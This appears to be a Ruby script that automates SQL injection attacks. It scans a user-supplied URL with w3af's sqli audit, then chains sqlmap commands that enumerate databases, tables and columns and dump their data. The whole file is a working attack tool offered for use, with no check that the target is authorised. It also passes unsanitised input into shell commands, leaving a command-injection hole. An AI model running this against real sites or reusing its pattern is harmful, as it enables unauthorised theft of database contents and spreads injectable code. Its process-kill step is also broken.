puts 'SQLi PentestEd'
puts 'This is an automatized tool for SQL Injection Penetration Test'
puts "\n Please, enter a target URL:"
targetURL = gets.chomp.to_s

fname = 'w3af_tempFile.w3af'
myFile = File.new(fname, "w")

myFile.syswrite("plugins\n")
myFile.syswrite("audit sqli\n")
myFile.syswrite("back\n")
#myFile.syswrite("\n")
myFile.syswrite("target\n")
myFile.syswrite("set target #{targetURL}\n")
myFile.syswrite("back\n")
#myFile.syswrite("\n")
myFile.syswrite("start")
myFile.close

system "w3af_console -s #{fname} > temp &"
#pid=`$!`
sleep 45
`kill -9 $! 2>/dev/null` # #{pid}
File.delete(myFile)

content= `cat temp`
if content.include? "A SQL error"
  puts 'There is an sql injection!'
  puts 'Lets try to acess to databases..'
  system "sqlmap -u \"#{targetURL}\" --dbs"
  puts 'Please, enter a database name to get tables:'
  dbname=gets.chomp.to_s
  system "sqlmap -u \"#{targetURL}\" -D #{dbname} --tables"
  puts 'Please, enter a table name to get columns:'
  tblname=gets.chomp.to_s
  system "sqlmap -u \"#{targetURL}\" -D #{dbname} -T #{tblname} --columns"
  puts 'Please, enter a column names(separate them with a comma) to get data:'
  colname=gets.chomp.to_s
  system "sqlmap -u \"#{targetURL}\" -D #{dbname} -T #{tblname} -C #{colname} --dump"
  puts 'Bye Bye'
else
  puts 'It is clean, dude!'
end

File.delete("temp")

